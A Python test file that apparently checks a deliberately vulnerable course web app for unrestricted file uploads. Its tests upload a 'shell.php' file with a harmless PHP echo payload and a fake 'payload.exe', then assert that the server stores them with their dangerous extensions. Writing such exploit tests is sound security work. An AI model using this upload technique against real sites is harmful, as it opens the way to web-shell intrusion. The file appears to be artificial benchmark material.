import io
import requests


def api_url(base_url: str, path: str) -> str:
    return base_url.rstrip("/") + path


def json_of(resp):
    try:
        return resp.json()
    except Exception as exc:
        raise AssertionError(
            f"Expected JSON response, got status={resp.status_code}, body={resp.text}"
        ) from exc


def register(session: requests.Session, base_url: str, username: str, password: str, display_name: str):
    return session.post(
        api_url(base_url, "/api/auth/register"),
        json={
            "username": username,
            "password": password,
            "display_name": display_name,
        },
        timeout=10,
    )


def create_course(session: requests.Session, base_url: str, title: str, description: str):
    return session.post(
        api_url(base_url, "/api/courses"),
        json={
            "title": title,
            "description": description,
        },
        timeout=10,
    )


def upload_file_api(session: requests.Session, base_url: str, course_id: int, filename: str, content: bytes, content_type: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/uploads"),
        files={
            "file": (filename, io.BytesIO(content), content_type),
        },
        timeout=10,
    )


def list_uploads_api(session: requests.Session, base_url: str, course_id: int):
    return session.get(api_url(base_url, f"/api/courses/{course_id}/uploads"), timeout=10)


def test_exploit_vuln_001_staff_can_upload_arbitrary_active_file_type_via_api(app_instance):
    """
    Exploit expectation:
    Course staff can upload a dangerous active-content file such as .php because
    the server does not enforce extension/MIME/content restrictions.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()

    r = register(teacher, base_url, "upload_teacher", "pass123", "Upload Teacher")
    assert r.status_code == 201, r.text

    create_resp = create_course(teacher, base_url, "Upload Vuln Course", "demo")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    malicious_name = "shell.php"
    malicious_body = b"<?php echo 'owned'; ?>"
    malicious_type = "application/x-php"

    upload_resp = upload_file_api(
        teacher,
        base_url,
        course_id,
        malicious_name,
        malicious_body,
        malicious_type,
    )
    assert upload_resp.status_code == 201, upload_resp.text

    payload = json_of(upload_resp)
    assert payload["success"] is True
    assert payload["upload"]["original_name"] == malicious_name
    assert payload["upload"]["storage_path"].endswith(".php")

    uploads_resp = list_uploads_api(teacher, base_url, course_id)
    assert uploads_resp.status_code == 200, uploads_resp.text
    uploads_payload = json_of(uploads_resp)
    assert uploads_payload["success"] is True
    assert any(u["original_name"] == malicious_name for u in uploads_payload["uploads"])


def test_exploit_vuln_001_staff_can_upload_unauthorized_binary_via_api(app_instance):
    """
    Exploit expectation:
    Course staff can upload arbitrary binary content because the server accepts
    files without validating type, extension, or contents.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()

    r = register(teacher, base_url, "upload_teacher_bin", "pass123", "Upload Teacher Bin")
    assert r.status_code == 201, r.text

    create_resp = create_course(teacher, base_url, "Upload Vuln Binary Course", "demo")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    filename = "payload.exe"
    content = b"MZ\x90\x00FakeWindowsExecutable"
    content_type = "application/octet-stream"

    upload_resp = upload_file_api(
        teacher,
        base_url,
        course_id,
        filename,
        content,
        content_type,
    )
    assert upload_resp.status_code == 201, upload_resp.text

    payload = json_of(upload_resp)
    assert payload["success"] is True
    assert payload["upload"]["original_name"] == filename
    assert payload["upload"]["storage_path"].endswith(".exe")